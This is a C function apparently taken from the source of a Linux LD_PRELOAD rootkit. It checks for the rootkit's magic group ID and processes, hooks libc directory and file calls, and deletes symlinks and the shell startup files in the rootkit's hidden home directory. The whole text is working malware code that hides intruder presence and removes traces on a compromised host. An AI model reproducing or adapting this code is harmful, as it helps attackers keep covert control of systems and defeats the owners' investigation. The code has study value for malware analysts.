void bdvcleanse(void){
    gid_t magicgid = readgid();
    if(getuid() == magicgid || getgid() == magicgid || rkprocup())
        return;

    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT, CRMDIR);

    DIR *dp = call(COPENDIR, HOMEDIR);
    if(dp == NULL) return; // oh no

    struct dirent *dir;
    int i, lstatstat;
    size_t pathlen;
    struct stat pathstat;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        pathlen = strlen(HOMEDIR) + strlen(dir->d_name) + 2;
        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", HOMEDIR, dir->d_name);

        memset(&pathstat, 0, sizeof(struct stat));
        lstatstat = (long)call(C__LXSTAT, _STAT_VER, path, &pathstat);
        if(lstatstat < 0 || !S_ISLNK(pathstat.st_mode))
            continue;

        for(i = 0; i != LINKSRCS_SIZE; i++)
            if(!strcmp(basename(linkdests[i]), dir->d_name))
                call(CUNLINK, path);
    }
    closedir(dp);

    call(CUNLINK, BASHRC_PATH);
    call(CUNLINK, PROFILE_PATH);
}